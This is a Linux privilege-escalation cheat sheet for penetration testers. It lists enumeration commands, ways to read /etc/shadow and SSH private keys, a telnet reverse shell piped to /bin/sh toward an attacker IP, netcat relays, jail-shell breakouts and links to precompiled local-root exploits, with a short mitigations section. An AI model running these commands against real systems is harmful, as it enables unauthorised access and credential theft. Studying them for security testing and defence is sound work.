Privilege Escalation - Basic Linux

# Basic Linux Privilege Escalation

Before starting, I would like to point out - **I'm no expert**. As far as I know, there isn't a "magic" answer, in this huge area. This is simply my finding, typed up, to be shared *(my [starting point](https://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html))*. Below is a mixture of commands to do the same thing, to look at things in a different place or just a different light. I know there more "things" to look for. It's just a **basic & rough guide**. Not every command will work for each system as Linux varies so much. "It" will not jump off the screen - you've to hunt for that *"little thing"* as "*the devil is in the detail*".

#### **Enumeration is the key.**

(Linux) privilege escalation is all about:

- Collect - ***Enumeration****, more enumeration and some more enumeration.*
- Process - *Sort through data, ****analyse**** and prioritisation.*
- Search - *Know what to search for and where to ****find ****the exploit code.*
- Adapt - ***Customize**** the exploit, so it fits. Not every exploit work for every system "out of the box".*
- Try - *Get ready for (lots of) ****trial and error****.*

## **Operating System**

#### **What's the distribution type? *What version?***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | cat /etc/issue<br>cat /etc/*-release<br>cat /etc/lsb-release # Debian based<br>cat /etc/redhat-release # Redhat based |

#### **What's the kernel version? *Is it 64-bit?***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6 | cat /proc/version<br>uname -a<br>uname -mrs<br>rpm -q kernel<br>dmesg \| grep Linux<br>ls /boot \| grep vmlinuz- |

#### **What can be learnt from the environmental variables?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7 | cat /etc/profile<br>cat /etc/bashrc<br>cat ~/.bash_profile<br>cat ~/.bashrc<br>cat ~/.bash_logout<br>env<br>set |

#### **Is there a printer?**

|     |     |
| --- | --- |
| 1   | lpstat -a |

## **Applications & Services**

#### **What services are running? *Which service has which user privilege?***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | ps<br>ps -ef<br>top<br>cat /etc/services |

#### **Which service(s) are been running by *root? Of these services, which are vulnerable - it's worth a double check!***

|     |     |
| --- | --- |
| 1<br>2 | ps aux \| grep root<br>ps -ef \| grep root |

$ps -U root -u root

service --status-all <-----> systemctl

To display all process running under a particular group, use the following command.

$ps –G [Group Name]

#### For a detailed overview, we can also combine –G option with –F option.

$ps –FG [Group Name]

#### To display all process in hierarchy, we can use the following command.

$ps –A --forest

####

####

#### **What applications are installed? *What version are they? Are they currently running?***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6 | ls -alh /usr/bin/<br>ls -alh /sbin/<br>dpkg -l<br>rpm -qa<br>ls -alh /var/cache/apt/archivesO<br>ls -alh /var/cache/yum/ |

#### **Any of the service(s) settings misconfigured? *Are any (vulnerable) plugins attached?***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10 | cat /etc/syslog.conf<br>cat /etc/chttp.conf<br>cat /etc/lighttpd.conf<br>cat /etc/cups/cupsd.conf<br>cat /etc/inetd.conf<br>cat /etc/apache2/apache2.conf<br>cat /etc/my.conf<br>cat /etc/httpd/conf/httpd.conf<br>cat /opt/lampp/etc/httpd.conf<br>ls -aRl /etc/ \| awk '$1 ~ /^.*r.*/ |

#### **What jobs are scheduled?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12 | crontab -l<br>ls -alh /var/spool/cron<br>ls -al /etc/ \| grep cron<br>ls -al /etc/cron*<br>cat /etc/cron*<br>cat /etc/at.allow<br>cat /etc/at.deny<br>cat /etc/cron.allow<br>cat /etc/cron.deny<br>cat /etc/crontab<br>cat /etc/anacrontab<br>cat /var/spool/cron/crontabs/root |

#### **Any plain text usernames and/or passwords?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | grep -i user [filename]<br>grep -i pass [filename]<br>grep -C 5 "password" [filename]<br>find . -name "*.php" -print0 \| xargs -0 grep -i -n "var $password" # Joomla |

## **Communications & Networking**

#### **What NIC(s) does the system have? *Is it connected to another network?***

|     |     |
| --- | --- |
| 1<br>2<br>3 | /sbin/ifconfig -a<br>cat /etc/network/interfaces<br>cat /etc/sysconfig/network |

#### **What are the network configuration settings? *What can you find out about this network? DHCP server? DNS server? Gateway?***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6 | cat /etc/resolv.conf<br>cat /etc/sysconfig/network<br>cat /etc/networks<br>iptables -L<br>hostname<br>dnsdomainname |

#### **What other users & hosts are communicating with the system?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10 | lsof -i<br>lsof -i :80<br>grep 80 /etc/servicesls -<br>netstat -antup<br>netstat -antpx<br>netstat -tulpn<br>chkconfig --list<br>chkconfig --list \| grep 3:on<br>last<br>w |

#### **Whats cached? *IP and/or MAC addresses***

|     |     |
| --- | --- |
| 1<br>2<br>3 | arp -e<br>route<br>/sbin/route -nee |

#### **Is packet sniffing possible? What can be seen? *Listen to live traffic***

|     |     |
| --- | --- |
| 1   | tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 |

*Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]*

#### **Have you got a shell? *Can you interact with the system?***

|     |     |
| --- | --- |
| 1<br>2<br>3 | nc -lvp 4444    # Attacker. Input (Commands)<br>nc -lvp 4445 # Attacker. Ouput (Results)<br>telnet [atackers ip] 44444 \| /bin/sh \| [local ip] 44445 # On the targets system. Use the attackers IP! |

*Note: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/*

#### **Is port forwarding possible? *Redirect and interact with traffic from another view***

*Note: http://www.boutell.com/rinetd/*

*Note: [http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch](https://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch)*

*Note: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip*

*Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]*

|     |     |
| --- | --- |
| 1   | FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 |

*Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]*

|     |     |
| --- | --- |
| 1<br>2 | ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port<br>ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port |

*Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe*

|     |     |
| --- | --- |
| 1<br>2<br>3 | mknod backpipe p ; nc -l -p 8080 < backpipe \| nc 10.5.5.151 80 >backpipe    # Port Relay<br>mknod backpipe p ; nc -l -p 8080 0 & < backpipe \| tee -a inflow \| nc localhost 80 \| tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)<br>mknod backpipe p ; nc -l -p 8080 0 & < backpipe \| tee -a inflow \| nc localhost 80 \| tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080) |

#### **Is tunnelling possible? *Send commands locally, remotely***

|     |     |
| --- | --- |
| 1<br>2 | ssh -D 127.0.0.1:9050 -N [username]@[ip]<br>proxychains ifconfig |

## **Confidential Information & Users**

#### **Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9 | id<br>who<br>w<br>last<br>cat /etc/passwd \| cut -d: -f1 # List of users<br>grep -v -E "^#" /etc/passwd \| awk -F: '$3 == 0 { print $1}' # List of super users<br>awk -F: '($3 == "0") {print}' /etc/passwd # List of super users<br>cat /etc/sudoers<br>sudo -l<br>tty |

#### **What sensitive files can be found?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | cat /etc/passwd<br>cat /etc/group<br>cat /etc/shadow<br>ls -alh /var/mail/ |

#### **Anything "interesting" in the home directorie(s)? *If it's possible to access***

|     |     |
| --- | --- |
| 1<br>2 | ls -ahlR /root/<br>ls -ahlR /home/ |

#### **Are there any passwords in; scripts, databases, configuration files or log files? *Default paths and locations for passwords***

|     |     |
| --- | --- |
| 1<br>2<br>3 | cat /var/apache2/config.inc<br>cat /var/lib/mysql/mysql/user.MYD<br>cat /root/anaconda-ks.cfg |

#### **What has the user being doing? *Is there any password in plain text? What have they been edting?***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5 | cat ~/.bash_history<br>cat ~/.nano_history<br>cat ~/.atftp_history<br>cat ~/.mysql_history<br>cat ~/.php_history |

#### **What user information can be found?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | cat ~/.bashrc<br>cat ~/.profile<br>cat /var/mail/root<br>cat /var/spool/mail/root |

#### **Can private-key information be found?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15 | cat ~/.ssh/authorized_keys<br>cat ~/.ssh/identity.pub<br>cat ~/.ssh/identity<br>cat ~/.ssh/id_rsa.pub<br>cat ~/.ssh/id_rsa<br>cat ~/.ssh/id_dsa.pub<br>cat ~/.ssh/id_dsa<br>cat /etc/ssh/ssh_config<br>cat /etc/ssh/sshd_config<br>cat /etc/ssh/ssh_host_dsa_key.pub<br>cat /etc/ssh/ssh_host_dsa_key<br>cat /etc/ssh/ssh_host_rsa_key.pub<br>cat /etc/ssh/ssh_host_rsa_key<br>cat /etc/ssh/ssh_host_key.pub<br>cat /etc/ssh/ssh_host_key |

## **File Systems**

#### **Which configuration files can be written in /etc/? *Able to reconfigure a service?***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7 | ls -aRl /etc/ \| awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone<br>ls -aRl /etc/ \| awk '$1 ~ /^.....w/' 2>/dev/null # Group<br>ls -aRl /etc/ \| awk '$1 ~ /w.$/' 2>/dev/null # Other<br>find /etc/ -readable -type f 2>/dev/null # Anyone<br>find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone |

#### **What can be found in /var/ ?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7 | ls -alh /var/log<br>ls -alh /var/mail<br>ls -alh /var/spool<br>ls -alh /var/spool/lpd<br>ls -alh /var/lib/pgsql<br>ls -alh /var/lib/mysql<br>cat /var/lib/dhcp3/dhclient.leases |

#### **Any settings/files (hidden) on website? *Any settings file with database information?***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5 | ls -alhR /var/www/<br>ls -alhR /srv/www/htdocs/<br>ls -alhR /usr/local/www/apache22/data/<br>ls -alhR /opt/lampp/htdocs/<br>ls -alhR /var/www/html/ |

Is there anything in the log file(s) *(Could help with "Local File Includes"!)*

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40 | cat /etc/httpd/logs/access_log<br>cat /etc/httpd/logs/access.log<br>cat /etc/httpd/logs/error_log<br>cat /etc/httpd/logs/error.log<br>cat /var/log/apache2/access_log<br>cat /var/log/apache2/access.log<br>cat /var/log/apache2/error_log<br>cat /var/log/apache2/error.log<br>cat /var/log/apache/access_log<br>cat /var/log/apache/access.log<br>cat /var/log/auth.log<br>cat /var/log/chttp.log<br>cat /var/log/cups/error_log<br>cat /var/log/dpkg.log<br>cat /var/log/faillog<br>cat /var/log/httpd/access_log<br>cat /var/log/httpd/access.log<br>cat /var/log/httpd/error_log<br>cat /var/log/httpd/error.log<br>cat /var/log/lastlog<br>cat /var/log/lighttpd/access.log<br>cat /var/log/lighttpd/error.log<br>cat /var/log/lighttpd/lighttpd.access.log<br>cat /var/log/lighttpd/lighttpd.error.log<br>cat /var/log/messages<br>cat /var/log/secure<br>cat /var/log/syslog<br>cat /var/log/wtmp<br>cat /var/log/xferlog<br>cat /var/log/yum.log<br>cat /var/run/utmp<br>cat /var/webmin/miniserv.log<br>cat /var/www/logs/access_log<br>cat /var/www/logs/access.log<br>ls -alh /var/lib/dhcp3/<br>ls -alh /var/log/postgresql/<br>ls -alh /var/log/proftpd/<br>ls -alh /var/log/samba/<br>Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp |

*Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/*

#### **If commands are limited, you break out of the "jail" shell?**

|     |     |
| --- | --- |
| 1<br>2<br>3 | python -c 'import pty;pty.spawn("/bin/bash")'<br>echo os.system('/bin/bash')<br>/bin/sh -i<br>SHELL=/bin/bash script -q /dev/null |

#### **How are file-systems mounted?**

|     |     |
| --- | --- |
| 1<br>2 | mount<br>df -h |

#### **Are there any unmounted file-systems?**

|     |     |
| --- | --- |
| 1   | cat /etc/fstab |

#### **What "Advanced Linux File Permissions" are used? *Sticky bits, SUID & GUID***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9 | find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.<br>find / -perm -g=s -type f 2>/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.<br>find / -perm -u=s -type f 2>/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.<br>find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID<br>for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)<br># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)<br>find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null |

#### **Where can written to and executed from? *A few 'common' places: /tmp, /var/tmp, /dev/shm***

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7 | find / -writable -type d 2>/dev/null      # world-writeable folders<br>find / -perm -222 -type d 2>/dev/null # world-writeable folders<br>find / -perm -o w -type d 2>/dev/null # world-writeable folders<br>find / -perm -o x -type d 2>/dev/null # world-executable folders<br>find / \( -perm -o w -perm -o x \) -type d 2>/dev/null # world-writeable & executable folders |

#### **Any "problem" files? *Word-writeable, "nobody" files***

|     |     |
| --- | --- |
| 1<br>2 | find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files<br>find /dir -xdev \( -nouser -o -nogroup \) -print # Noowner files |

## **Preparation & Finding Exploit Code**

#### **What development tools/languages are installed/supported?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | find / -name perl*<br>find / -name python*<br>find / -name gcc*<br>find / -name cc |

#### **How can files be uploaded?**

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5 | find / -name wget<br>find / -name nc*<br>find / -name netcat*<br>find / -name tftp*<br>find / -name ftp |

#### **Finding exploit code**

[http://www.exploit-db.com](https://www.exploit-db.com/)

[http://1337day.com](http://1337day.com/)

[http://www.securiteam.com](http://www.securiteam.com/)

[http://www.securityfocus.com](http://www.securityfocus.com/)

[http://www.exploitsearch.net](http://www.exploitsearch.net/)

http://metasploit.com/modules/

[http://securityreason.com](http://securityreason.com/)

http://seclists.org/fulldisclosure/

[http://www.google.com](https://www.google.com/)

#### **Finding more information regarding the exploit**

[http://www.cvedetails.com](https://www.cvedetails.com/)

http://packetstormsecurity.org/files/cve/[CVE]

http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]

http://www.vulnview.com/cve-details.php?cvename=[CVE]

#### **(Quick) "Common" exploits. *Warning. Pre-compiled binaries files. Use at your own risk***

[http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/](https://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/)

http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/

## **Mitigations**

#### **Is any of the above information easy to find?**

Try doing it! Setup a cron job which automates script(s) and/or 3rd party products

#### **Is the system fully patched?**

*Kernel, operating system, all applications, their plugins and web services*

|     |     |
| --- | --- |
| 1<br>2 | apt-get update && apt-get upgrade<br>yum update |

#### **Are services running with the minimum level of privileges required?**

For example, do you need to run MySQL as root?

#### **Scripts *Can any of this be automated?!***

http://pentestmonkey.net/tools/unix-privesc-check/

http://labs.portcullis.co.uk/application/enum4linux/

[http://bastille-linux.sourceforge.net](http://bastille-linux.sourceforge.net/)

## **Other (quick) guides & Links**

#### **Enumeration**

http://www.0daysecurity.com/penetration-testing/enumeration.html

http://www.microloft.co.uk/hacking/hacking3.htm

#### **Misc**

[http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf](https://jon.oberheide.org/files/stackjacking-infiltrate11.pdf)

http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf

[http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html](https://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html)